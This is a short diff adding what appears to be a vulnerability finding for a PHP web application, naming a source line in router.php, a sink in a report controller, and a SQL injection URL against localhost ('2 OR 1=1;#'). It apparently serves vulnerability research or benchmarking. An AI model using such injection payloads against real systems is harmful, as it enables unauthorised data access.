@@ -1,0 +1,5 @@
+source router.php:259
+sink plugins/controllers/report.php:18
+
+exploit http://localhost:9000/report/edit/2%20OR%201=1;#
+
